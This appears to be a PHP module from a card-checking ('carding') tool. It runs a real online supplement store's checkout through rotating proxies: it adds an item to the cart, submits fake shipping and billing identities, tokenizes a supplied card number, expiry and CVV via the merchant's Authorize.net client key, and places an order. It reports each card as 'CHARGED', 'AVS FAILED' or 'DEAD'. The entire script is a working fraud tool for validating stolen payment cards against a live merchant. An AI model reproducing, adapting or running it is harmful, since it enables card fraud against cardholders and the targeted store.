<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://brainmd.com/what-to-eat-when-youre-pregnant', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$chk_url = $this->getstr($this->getstr($r1->body, '<form data-product-sku="', ' method'), 'action="', '"');

$form_key = trim(strip_tags($this->getstr($r1->body, '<input name="form_key" type="hidden" value="', '"')));

if (empty($chk_url) || empty($form_key)) {
	$empty = 'Form Key is Empty';

	goto start;
}

$data = 'product=766&selected_configurable_option=&related_product=&item=766&form_key='.$form_key.'&qty=1';

$headers = [
	'cookie: go=go; form_key='.$form_key
];

$r2 = $this->curlx->Post($chk_url, $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$err = $this->getstr(urldecode($this->getstr($r2->headers->response['Set-Cookie'] ?? '', 'mage-messages=', ';')), 'error","text":"', '"');

if (!empty($err)) {
	$empty = $err;

	goto start;
}

$r3 = $this->curlx->Get('https://brainmd.com/checkout/', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$entity_id = trim(strip_tags($this->getstr($r3->body, 'entity_id":"', '"')));

if (empty($entity_id)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 Main St"],"company":"","telephone":"(256) 456-7654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","customAttributes":[{"attribute_code":"kl_email_consent","value":""}]},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 Main St"],"company":"","telephone":"(256) 456-7654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","customAttributes":[{"attribute_code":"kl_email_consent","value":""}],"saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{"kl_sms_consent":false,"kl_email_consent":false}}}';

$headers = [
	'content-type: application/json',
	'x-requested-with: XMLHttpRequest'
];

$r4 = $this->curlx->Post('https://brainmd.com/rest/default/V1/guest-carts/'.$entity_id.'/shipping-information', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$data = '{"securePaymentContainerRequest":{"merchantAuthentication":{"name":"ACI92660","clientKey":"2wmVXud95GKUe2G29r8Gjs2JGK2hLkQndVsMa6J9nT785SL3NYRacFZ6WkX89u9V"},"data":{"type":"TOKEN","id":"'.substr($fake->guid, 0, -6).'","token":{"cardNumber":"'.$cc.'","expirationDate":"'.$mm.''.$yyyy.'","cardCode":"'.$cvv.'"}}}}';

$headers = [
	'content-type: application/json; charset=UTF-8'
];

$r5 = $this->curlx->Post('https://api2.authorize.net/xml/v1/request.api', $data, $headers, $cookie, $server['proxy']);

if (!$r5->success) goto start;

if (strpos($r5->body, 'resultCode":"Error') !== false) {
	$err = empty($tmp = $this->getstr($r5->body, 'text":"', '"')) ? 'Unknown Error' : $tmp;

	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - $err!"];

	goto end;
}

$dataValue = $this->getstr($r5->body, 'dataValue":"', '"');

if (empty($dataValue)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$data = '{"cartId":"'.$entity_id.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 Main St"],"company":"","telephone":"(256) 456-7654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","customAttributes":[{"attribute_code":"kl_email_consent","value":""}],"saveInAddressBook":null},"paymentMethod":{"method":"anet_creditcard","additional_data":{"opaque_data":"{\"dataDescriptor\":\"COMMON.ACCEPT.INAPP.PAYMENT\",\"dataValue\":\"'.$dataValue.'\"}","cardExpYear":"'.$yyyy.'","cardExpMonth":"'.$m.'","amccpa_agreement":"{\"undefined\":false}"},"extension_attributes":{"zip_code":"","agreement_ids":["1"]}},"email":"'.$fake->email.'"}';

$headers = [
	'content-type: application/json',
	'x-requested-with: XMLHttpRequest'
];

$r6 = $this->curlx->Post('https://brainmd.com/rest/default/V1/guest-carts/'.$entity_id.'/payment-information', $data, $headers, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$json_r6 = json_decode($r6->body);

$msg = $json_r6->message ?? '';

if (empty($msg)) {
	file_put_contents('aua_r6_no_msg.txt', $r6->body . PHP_EOL, FILE_APPEND);

	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - This transaction has been approved."];

	goto end;
}

if (strpos($r6->body, 'success":true') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - This transaction has been approved.'];
} elseif (strpos($r6->body, 'AVS') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - $msg!"];
} else {
	$msg = empty($msg) ? 'Unknown Error' : $msg;

	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - $msg"];
}

end: